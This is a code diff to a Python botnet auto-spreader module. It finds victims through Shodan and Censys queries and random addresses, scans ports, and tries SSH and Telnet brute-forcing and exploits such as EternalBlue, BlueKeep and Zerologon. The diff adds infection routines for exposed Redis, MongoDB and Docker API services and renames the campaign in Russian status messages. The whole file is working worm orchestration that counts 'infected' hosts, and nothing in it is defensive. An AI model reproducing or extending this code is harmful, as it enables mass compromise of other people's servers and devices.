@@ -1,18 +1,18 @@
 import asyncio, threading, time, json, os, random, ipaddress, socket, struct, queue
 from botnet.spreader import (
     ssh_bruteforce, telnet_bruteforce, exploit_eternalblue, exploit_bluekeep,
-    exploit_mikrotik, exploit_zerologon, exploit_zyxel, exploit_netgear,
-    exploit_dlink_hnap, init_db
+    exploit_mikrotik, exploit_zerologon, exploit_redis, exploit_mongodb,
+    exploit_docker_api, init_db, add_bot
 )
 from utils.logger import log
-import shodan
+import shodan, censys
 
 class AutoSpreader:
     def __init__(self, settings_file="avz_settings.json"):
         self.running = False
         self.thread = None
         self.message_queue = queue.Queue()
-        self.stats = {'scanned':0, 'infected':0, 'open_ports':0, 'total':0}
+        self.stats = {'scanned':0, 'infected':0, 'open_ports':0}
         self.load_settings(settings_file)
 
     def load_settings(self, path):
@@ -27,20 +27,29 @@ class AutoSpreader:
         self.random_global = s.get("auto_spread_random_global", True)
         self.worker_threads = s.get("spread_worker_threads", 500)
         self.use_shodan = s.get("use_shodan", True)
-        self.shodan_query = s.get("shodan_search_query", "port:22,23")
+        self.use_censys = s.get("use_censys", False)
+        self.shodan_query = s.get("shodan_search_query", "port:22,23,6379,27017,2375")
         self.shodan_api = None
+        self.censys_api = None
         try:
             if self.use_shodan:
                 self.shodan_api = shodan.Shodan(s.get('shodan_api_key', ''))
+        except: pass
+        try:
+            if self.use_censys:
+                self.censys_api = censys.SearchAPI(
+                    api_id=s.get('censys_api_id', ''),
+                    api_secret=s.get('censys_api_secret', '')
+                )
         except: pass
 
     def start(self):
         if self.running: return
         self.running = True
-        self.stats = {'scanned':0, 'infected':0, 'open_ports':0, 'total':0}
+        self.stats = {'scanned':0, 'infected':0, 'open_ports':0}
         self.thread = threading.Thread(target=self._worker, daemon=True)
         self.thread.start()
-        self.message_queue.put("[System] Автозахват TSUNAMI запущен")
+        self.message_queue.put("[System] OVERLORD захват запущен")
 
     def stop(self):
         self.running = False
@@ -55,7 +64,10 @@ class AutoSpreader:
             return ip
 
     async def attack_target(self, ip):
-        ports = await ssh_bruteforce.__globals__['quick_port_scan'](ip, [22,23,445,3389,8291,80], 0.8)
+        # Расширенный набор портов для серверных сервисов
+        ports = await ssh_bruteforce.__globals__['quick_port_scan'](
+            ip, [22,23,445,3389,8291,6379,27017,2375], 0.8
+        )
         if not ports:
             return False
         self.stats['open_ports'] += 1
@@ -68,11 +80,18 @@ class AutoSpreader:
             if (await ssh_bruteforce(ip))[0]:
                 self.stats['infected'] += 1
                 return True
-        if 80 in ports:
-            for exp in [exploit_zyxel, exploit_netgear, exploit_dlink_hnap]:
-                if await exp(ip):
-                    self.stats['infected'] += 1
-                    return True
+        if 6379 in ports:
+            if await exploit_redis(ip):
+                self.stats['infected'] += 1
+                return True
+        if 27017 in ports:
+            if await exploit_mongodb(ip):
+                self.stats['infected'] += 1
+                return True
+        if 2375 in ports:
+            if await exploit_docker_api(ip):
+                self.stats['infected'] += 1
+                return True
         if 445 in ports:
             if any(await asyncio.gather(exploit_eternalblue(ip), exploit_zerologon(ip))):
                 self.stats['infected'] += 1
@@ -96,6 +115,12 @@ class AutoSpreader:
                 try:
                     results = self.shodan_api.search(self.shodan_query, limit=200)
                     target_ips = [match['ip_str'] for match in results['matches']]
+                except:
+                    pass
+            if self.censys_api:
+                try:
+                    results = self.censys_api.search("(services.port: 6379) OR (services.port: 27017) OR (services.port: 2375)", per_page=100)
+                    target_ips.extend([hit['ip'] for hit in results['results']])
                 except:
                     pass
             if not target_ips:
